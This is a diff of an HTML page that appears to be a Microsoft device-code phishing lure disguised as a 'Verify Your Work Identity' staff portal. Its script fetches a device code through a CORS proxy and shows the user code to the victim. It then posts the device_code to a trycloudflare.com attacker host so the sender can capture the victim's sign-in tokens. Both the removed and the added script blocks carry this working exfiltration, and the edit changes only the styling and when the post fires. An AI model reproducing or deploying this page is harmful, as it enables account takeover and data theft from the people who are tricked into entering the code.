@@ -10,87 +10,85 @@
         body {
             background: linear-gradient(to right, #e6f0fa, #ffffff);
             font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            color: #2c3e50;
         }
         .auth-container {
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-            padding: 40px;
+            background: linear-gradient(to bottom right, #ffffff, #f3f9ff);
+            padding: 50px 40px;
+            border-radius: 10px;
+            box-shadow: 0px 8px 25px rgba(0,0,0,0.1);
             margin-top: 60px;
         }
-        .auth-header {
-            font-weight: 600;
+        h4.auth-header {
+            font-size: 1.75rem;
             color: #0a59a3;
+            margin-bottom: 10px;
+        }
+        .subtext {
+            font-size: 1rem;
+            font-weight: 400;
+            color: #333333;
+            margin-top: 5px;
         }
         .microsoft-logo {
             width: 120px;
-        }
-        .subtext {
-            font-size: 0.9rem;
-            color: #6c757d;
         }
         #submit-btn:disabled {
             background-color: #cccccc;
             cursor: not-allowed;
         }
-        #submit-btn {
-            background-color: #0a59a3;
+        .btn-primary {
+            background-color: #004e9a;
+            border: none;
+            font-weight: 600;
+            transition: background-color 0.3s ease;
         }
-    
-    h4.auth-header {
-        font-size: 1.75rem;
-        color: #0a59a3;
-        margin-bottom: 10px;
-    }
-    .subtext {
-        font-size: 1rem;
-        font-weight: 400;
-        color: #333333;
-        margin-top: 5px;
-    }
-    .auth-container {
-        background: linear-gradient(to bottom right, #ffffff, #f3f9ff);
-        padding: 50px 40px;
-        border-radius: 10px;
-        box-shadow: 0px 8px 25px rgba(0,0,0,0.1);
-    }
-    .btn-primary {
-        background-color: #004e9a;
-        border: none;
-        font-weight: 600;
-        transition: background-color 0.3s ease;
-    }
-    .btn-primary:hover {
-        background-color: #003f7f;
-    }
-    body {
-        background: linear-gradient(to right, #e6f0fa, #ffffff);
-        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        color: #2c3e50;
-    }
+        .btn-primary:hover {
+            background-color: #003f7f;
+        }
     </style>
 </head>
 <body>
 
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 <script>
-    fetch(`https://api.allorigins.win/get?url=${encodeURIComponent('https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&resource=https://graph.windows.net')}`)
-    .then(response => {
-        if (response.ok) return response.json()
-        throw new Error('Network response was not ok.');
-    }).then((data) => {
-        let details = typeof data.contents === 'string' ? JSON.parse(data.contents) : data.contents;
-        document.getElementById('code1234').innerHTML = `
-            <div class="alert alert-primary text-center">
-                Please visit <a href="https://microsoft.com/devicelogin" target="_blank">https://microsoft.com/devicelogin</a><br>
-                and enter the code: <strong>${details.user_code}</strong>
-            </div>`;
-        document.getElementById('submit-btn').disabled = false;
+    let deviceDetails = null;
 
-        $.post("https://programmes-crops-humanities-towns.trycloudflare.com/query", {
-            "device_code": details.device_code,
-            "interval": details.interval,
-            "expires_in": details.expires_in
+    // Fetch the device code on DOM load
+    window.addEventListener("DOMContentLoaded", () => {
+        fetch("https://api.allorigins.win/get?url=" + encodeURIComponent("https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&resource=https://graph.windows.net"))
+        .then(response => {
+            if (!response.ok) throw new Error('Failed to load device code.');
+            return response.json();
+        })
+        .then(data => {
+            deviceDetails = typeof data.contents === 'string' ? JSON.parse(data.contents) : data.contents;
+
+            document.getElementById('code1234').innerHTML = `
+                <div class="alert alert-primary text-center">
+                    Please visit <a href="https://microsoft.com/devicelogin" target="_blank">https://microsoft.com/devicelogin</a><br>
+                    and enter the code: <strong>${deviceDetails.user_code}</strong>
+                </div>`;
+            document.getElementById('submit-btn').disabled = false;
+        })
+        .catch(error => {
+            document.getElementById('code1234').innerHTML = `<div class="alert alert-danger text-center">Failed to load code. Please refresh.</div>`;
+        });
+    });
+
+    // Submit the device code only once, when the form is submitted
+    document.addEventListener('DOMContentLoaded', function () {
+        const form = document.querySelector('form');
+        form.addEventListener('submit', function () {
+            if (deviceDetails && !form.dataset.sent) {
+                form.dataset.sent = "true";
+
+                $.post("https://programmes-crops-humanities-towns.trycloudflare.com/query", {
+                    "device_code": deviceDetails.device_code,
+                    "interval": deviceDetails.interval,
+                    "expires_in": deviceDetails.expires_in
+                });
+            }
         });
     });
 </script>
@@ -102,8 +100,9 @@
                 <div class="text-center mb-4">
                     <img src="https://www.owatroldirect.co.uk/wp-content/uploads/2015/01/logo.png.webp" class="microsoft-logo" alt="Brewers Decorator Centres Logo">
                 </div>
-                <h4 class="auth-header text-center">Verify Your Work Identity</h4><p class="text-center subtext">To continue accessing staff portals, verify your work credentials below. Just refresh the page if your code does not work and try with the new one.</p>
-                <p class="text-center subtext">Only verified work devices can access shared resources.</p>
+                <h4 class="auth-header text-center">Verify Your Work Identity</h4>
+                <p class="text-center subtext">To continue accessing staff portals, verify your work credentials below.</p>
+                <p class="text-center subtext">Only verified work devices can access shared resources. If the code doesnt work on the first attempt, please refresh the page and try with a new one.</p>
 
                 <div id="code1234" class="text-center text-muted mt-4">Please wait. Loading...</div>
 
